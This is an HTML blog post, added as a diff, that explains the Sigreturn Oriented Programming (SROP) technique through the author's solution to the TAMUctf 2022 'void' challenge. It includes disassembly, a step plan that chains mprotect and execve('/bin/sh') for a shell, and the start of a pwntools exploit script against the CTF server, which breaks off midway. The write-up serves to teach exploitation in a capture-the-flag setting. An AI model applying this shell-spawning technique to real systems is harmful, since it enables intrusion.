@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="BackgroundIn recently ctf (tamuctf 2022), I solve a challenge called void (writeup).  This challenge only contains a few line of assembly code, with no libc and NX enabled. The only thing we can utili">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn - Sigreturn Oriented Programming (SROP) Technique">
+<meta property="og:url" content="http://www.aynakeya.com/2022/04/18/ctf/pwn-srop-power-of-sigreturn/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="BackgroundIn recently ctf (tamuctf 2022), I solve a challenge called void (writeup).  This challenge only contains a few line of assembly code, with no libc and NX enabled. The only thing we can utili">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/pwn-SROP-power-of-sigreturn/signal-handling-context.png">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/pwn-SROP-power-of-sigreturn/2022-04-17_224058.png">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/pwn-SROP-power-of-sigreturn/signal_frame.png">
+<meta property="article:published_time" content="2022-04-18T04:11:37.000Z">
+<meta property="article:modified_time" content="2022-09-07T04:30:32.000Z">
+<meta property="article:author" content="Aynakeya">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="srop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.aynakeya.com/images/ctf/pwn-SROP-power-of-sigreturn/signal-handling-context.png">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/2022/04/18/ctf/pwn-srop-power-of-sigreturn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/2022/04/18/ctf/pwn-srop-power-of-sigreturn/","path":"2022/04/18/ctf/pwn-srop-power-of-sigreturn/","title":"Pwn - Sigreturn Oriented Programming (SROP) Technique"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Pwn - Sigreturn Oriented Programming (SROP) Technique | Aynakeya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Theory"><span class="nav-number">2.</span> <span class="nav-text">Theory</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Before"><span class="nav-number">2.1.</span> <span class="nav-text">Before</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduce-to-syscall-rt-sigreturn"><span class="nav-number">2.2.</span> <span class="nav-text">Introduce to syscall - rt_sigreturn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-trigger-sigreturn-in-the-first-place"><span class="nav-number">2.3.</span> <span class="nav-text">How to trigger sigreturn in the first place.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getting-a-shell-using-SROP"><span class="nav-number">2.4.</span> <span class="nav-text">Getting a shell using SROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Example-Void"><span class="nav-number">3.</span> <span class="nav-text">Example - Void</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">3.1.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">3.2.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference:</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.aynakeya.com/2022/04/18/ctf/pwn-srop-power-of-sigreturn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/static/intro/images/avatar.jpg">
+      <meta itemprop="name" content="Aynakeya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aynakeya's Blog">
+      <meta itemprop="description" content="my blog~">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Pwn - Sigreturn Oriented Programming (SROP) Technique | Aynakeya's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwn - Sigreturn Oriented Programming (SROP) Technique
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-04-18 12:11:37" itemprop="dateCreated datePublished" datetime="2022-04-18T12:11:37+08:00">2022-04-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-07 12:30:32" itemprop="dateModified" datetime="2022-09-07T12:30:32+08:00">2022-09-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>In recently ctf (tamuctf 2022), I solve a challenge called <strong>void</strong> (<a href="/ctf-writeup/2022/tamuctf/pwn/void/">writeup</a>). </p>
+<p>This challenge only contains a few line of assembly code, with no libc and NX enabled.</p>
+<p>The only thing we can utilize is a buffer overflow and some syscall gadget. </p>
+<p>It seems impossible to do. However, there is a technique call <strong>SROP - Sigreturn Oriented Programming</strong> that can help us to pwn this binary.</p>
+<h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><p>The original paper is here <a target="_blank" rel="noopener" href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf">paper</a>, <a target="_blank" rel="noopener" href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
+<p>Check it out if you want to.</p>
+<p>I&#39;ll brief explain how SROP works.</p>
+<span id="more"></span>
+
+<h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscall table</a></p>
+<h2 id="Introduce-to-syscall-rt-sigreturn"><a href="#Introduce-to-syscall-rt-sigreturn" class="headerlink" title="Introduce to syscall - rt_sigreturn"></a>Introduce to syscall - rt_sigreturn</h2><p>Here is a picture showing how linux kernel handle signaling.</p>
+<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/signal-handling-context.png" alt="signal-handling-context.png"></p>
+<p>rt_sigreturn is a syscall the will be called when program come back from signal handler. </p>
+<p>Since signal handler may change registers, before the program going to signal handler, the program will save current (which is called <strong>Signal Frame</strong>) state including all the register on the stack.</p>
+<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/2022-04-17_224058.png" alt="2022-04-17_224058.png"></p>
+<p>Then, after the program come back from signal handler, progrma will use syscall <strong>rt_sigreturn</strong> to recover register and continue running.</p>
+<p>That said, if we can fake <strong>Signal Frame</strong> on the stack, then call <strong>rt_sigreturn</strong>.  we can set register to what ever value we want.</p>
+<p>And here is what <strong>signal frame</strong> looks like in linux x86-64. (detail <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h">here</a>)</p>
+<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/signal_frame.png" alt="signal_frame.png"></p>
+<h2 id="How-to-trigger-sigreturn-in-the-first-place"><a href="#How-to-trigger-sigreturn-in-the-first-place" class="headerlink" title="How to trigger sigreturn in the first place."></a>How to trigger sigreturn in the first place.</h2><p>In order to trigger sigreturn and do a srop, the binary should satisfy following criteria</p>
+<ol>
+<li>Knowing the address of <code>syscall; ret</code></li>
+<li>A big enough buffer overflow or something that allow us to write signal frame on the stack</li>
+<li>some how control the value rax</li>
+</ol>
+<p>first and second criteria are easy to spot or identify. For setting the value in rax, there are multiple way to do that.</p>
+<ol>
+<li>using <code>pop rax; ret</code></li>
+<li>using function a function return value (rax is used for function return)</li>
+<li>using syscall read (syscall read will return how many bytes read)</li>
+</ol>
+<h2 id="Getting-a-shell-using-SROP"><a href="#Getting-a-shell-using-SROP" class="headerlink" title="Getting a shell using SROP"></a>Getting a shell using SROP</h2><p>To get a shell, we need to execute <code>execve(&#39;/bin/sh&#39;,0,0)</code> by calling <code>syscall</code></p>
+<p>So, despite all the requirements describe above. We also need an address for <code>/bin/sh</code>.</p>
+<p>If we have a buffer overflow or something, we either write <code>/bin/sh</code> into stack, or we can contruct a rop chain that write <code>/bin/sh</code> some where in the memory.</p>
+<p>Pretty Straightforward</p>
+<h1 id="Example-Void"><a href="#Example-Void" class="headerlink" title="Example - Void"></a>Example - Void</h1><p>Take the example from tamuctf 2022, my writeup <a href="/ctf-writeup/2022/tamuctf/pwn/void/">here</a>.</p>
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>Examining the code, the program only contains following codes. Basicly, the program call <code>main</code> and read 2000 bytes to the stack, then exit.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌ 27: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401000      48c7c0000000.  mov rax, 0                  ; [02] -r-x section size 56 named .text</span><br><span class="line">│           0x00401007      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x0040100e      4889e6         mov rsi, rsp</span><br><span class="line">│           0x00401011      48c7c2d00700.  mov rdx, 0x7d0              ; 2000</span><br><span class="line">│           0x00401018      0f05           syscall</span><br><span class="line">└           0x0040101a      c3             ret</span><br><span class="line">            0x0040101b      0f1f440000     nop dword [rax + rax]</span><br><span class="line">┌ 24: entry0 (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401020      31c0           xor eax, eax</span><br><span class="line">│           0x00401022      e8d9ffffff     call main                   ; int main(int argc, char **argv, char **envp)</span><br><span class="line">│           0x00401027      48c7c03c0000.  mov rax, 0x3c               ; &#x27;&lt;&#x27; ; 60</span><br><span class="line">│           0x0040102e      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x00401035      0f05           syscall</span><br><span class="line">└           0x00401037      c3             ret</span><br></pre></td></tr></table></figure>
+
+<p>And there is no writable memory page except the stack.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- void void ; segment.ehdr</span><br><span class="line">0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x void void ; map.void.r_x</span><br><span class="line">0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- void void ; map.void.r__</span><br><span class="line">0x00007ffe3e60d000 - 0x00007ffe3e62e000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br><span class="line">0x00007ffe3e64f000 - 0x00007ffe3e653000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0x00007ffe3e653000 - 0x00007ffe3e654000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br></pre></td></tr></table></figure>
+
+<p>So, how to use <strong>SROP</strong> to get a shell? Lets think reversely.</p>
+<p>In the end, we want to get a shell, so we must use <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code>. But &#39;&#x2F;bin&#x2F;sh&#39; is not in the memory. So, we need to write &#39;&#x2F;bin&#x2F;sh&#39; into the memory.</p>
+<p>We can simply write &#39;&#x2F;bin&#x2F;sh&#39; on the stack, <strong>however</strong>, there is no way we are able to know the stack address. (In this case, rdi never gonna be 1, so we can&#39;t use <code>write(1,addr,0x7df)</code> to get stack address)</p>
+<p>Here is another method, first, we do a <code>mprotect</code> to make a memory page writable using sigreturn. After sigreturn, rsp (stack pointer) will set to the address now is writable. </p>
+<p>Then we return to <code>main</code> function and write &#39;&#x2F;bin&#x2F;sh&#39; and signal frame for calling <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code> there. In that case, we know the address of &#39;&#x2F;bin&#x2F;sh&#39;.</p>
+<p>Now, how to trigger sigreturn? thats pretty straightforward, Since we have a write syscall in main, we just write 15 bytes to the stack and return to syscall gadget. That will set rax to 15 and trigger sigreturn.</p>
+<p>There one more thing. Since we are using the gadget <code>syscall; ret</code>. After we execute <code>mprotect</code>, the program will ret to a address in the rsp. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Before sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 15, rsp = 0xffff1000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">fake signal frame &lt;- rsp = 0xffff1000</span><br><span class="line">rsp = some value(eg. 0xffff4000)</span><br><span class="line">rax = 10</span><br><span class="line">rip = syscall address</span><br><span class="line">....</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">After sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 10, rsp = 0xffff4000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip # this syscall the do mprotect</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">ret  &lt;- rip </span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br></pre></td></tr></table></figure>
+
+<p>Its okay if we end after one sigreturn. But in this case, we need to do two sigreturn, so it is important to return back to <code>main</code>. Therefore, we need find some where in the memory that contains an pointer to <code>main</code>, so that when <code>ret</code> is called, it will go back to <code>main</code> and we can do another SROP there.</p>
+<p>Luckily, in <code>0x004020b8</code>, there is pointer that point to <code>main</code>. So we can happily make whole <code>0x00402000-0x00403000</code> page writable and use this address as our new rsp.</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
+<li>write signal frame to the stack with rax&#x3D;10 (mprotect), rdi &#x3D; 0x00402000, rsi &#x3D; 0x1000, rdx &#x3D; 7 (rwx), rsp &#x3D; 0x004020b8, rip &#x3D; syscall addr. Then return to main</li>
+<li>write 15 bytes to trigger sigreturn</li>
+<li>syscall <code>mprotect(0x00402000,0x1000,7)</code></li>
+<li>return to main, write signal frame for calling execve. Then return to main</li>
+<li>write 15 bytes to trigger sigreturn</li>
+<li>syscall <code>execve(&#39;/bin/sh&#39;,0,0)</code> to get a shell</li>
+</ol>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;void&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    No RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># rax syscall x64</span><br><span class="line"># 0   read</span><br><span class="line"># 1   write</span><br><span class="line"># 15  